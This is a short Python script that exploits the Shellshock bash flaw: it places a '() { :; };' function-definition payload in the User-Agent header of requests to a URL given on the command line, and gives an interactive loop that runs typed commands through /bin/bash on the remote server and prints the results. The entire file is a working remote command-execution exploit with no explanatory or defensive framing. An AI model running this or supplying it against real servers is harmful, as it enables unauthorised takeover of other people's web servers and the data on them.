import sys
import requests

class Shellshock:
    def __init__(self):
        self.url = sys.argv[1]

    def buildRequest(self):
        userAgent = "() { :; }; echo; echo; /bin/bash -c '"+ self.payload  +"'"
        
        self.request = requests.get(self.url, headers = {
            'user-agent': userAgent
        })

    def sendPayload(self):
        self.buildRequest()
        
        print(self.request.text)

    def awaitInput(self):

        while True:
            cmdInput = input('')
        
            if cmdInput == 'exit':
                break

            self.payload = cmdInput

            self.sendPayload()
        
Shellshock().awaitInput()
